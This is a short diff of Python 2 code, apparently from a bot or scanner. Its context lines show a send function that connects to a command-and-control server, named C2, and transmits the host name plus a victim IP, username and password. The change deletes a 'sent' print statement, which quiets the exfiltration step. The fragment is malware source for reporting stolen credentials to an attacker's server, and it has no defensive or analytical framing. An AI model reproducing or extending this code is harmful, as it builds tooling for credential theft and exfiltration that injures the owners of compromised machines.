@@ -12,7 +12,6 @@ def send(ip, usr, pw):
         try:
             s.connect((C2, C2PORT))
             s.send(socket.gethostname() + " ---> " + ip + " " + usr + " " + pw)
-            print "sent"
         except socket.error, ex:
             print ex
     except KeyboardInterrupt:
